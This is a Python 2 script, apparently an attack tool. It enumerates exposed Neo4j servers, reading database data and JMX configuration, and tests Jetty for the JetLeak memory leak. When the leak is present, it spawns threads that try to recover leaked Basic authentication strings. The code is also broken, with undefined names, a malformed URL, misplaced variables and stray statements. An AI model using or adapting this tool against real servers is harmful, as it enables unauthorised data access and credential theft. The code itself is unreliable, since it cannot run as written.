from neo4jrestclient.request import Request
import gevent.monkey
gevent.monkey.patch_socket()

import gevent
import urllib2

import httplib, urllib, ssl, string, sys, getopt
from urlparse import urlparse

def neo4conn(target,port=7474,auth=False):

	try:
		req=Request()
		url="http://+"+target+":"+port
		if auth:
			req.username=auth.split(':')[0]
			req.password=auth.split(':')[1]
		data=req.get(url+"/data/db")
		return data

	except neo4jrestclient.exceptions.StatusException:
		print colored("\n[-] Neo4j Looks up , Requires Authentication \n",'blue')
		return data

def printneo4(jdata):
	for i in jdata:
				if type(i) is dict:
					for k in i:
							print i
	print colored(i+":"+jdata.get(i),'green')

def neo4enum(req,data):
	try:
		neo4conn
		jdata=data.json()
		print colored("[+] Database Data Info",'blue')
		printneo4(jdata)

		print colored("[+] Enumerating Server Configuration",'blue')
		data=req.get(url+'/db/manage/server/jmx/domain/org.neo4j/instance=kernel#0,name=Configuration')

		jdata=data.json()
		printneo4(jdata)

	except Exception as e:
			print e

def neo4jetleak(url):
	conn = httplib.HTTPConnection(url)
	def getmypass(count):
		headers = {"Referer": count}
		conn.request("POST", "/", "", headers)
		r1 = conn.getresponse()
		if r1.reason.find('Basic'):
			test=i
			string
	if (r1.status == 400 and ("Illegal character 0x0 in state" in r1.reason)):
	    print("\r\nThis version of Jetty is VULNERABLE to JetLeak!")
	    flag=1
	else:
	    print("\r\nThis version of Jetty is NOT vulnerable to JetLeak.")

	if flag:
		print colored("[+] Testing recovery of Auth String",'blue')
		threads = []
    	for i in xrange(100,400,5):
        	threads.append(gevent.spawn(fetch, i))
    	gevent.joinall(threads)
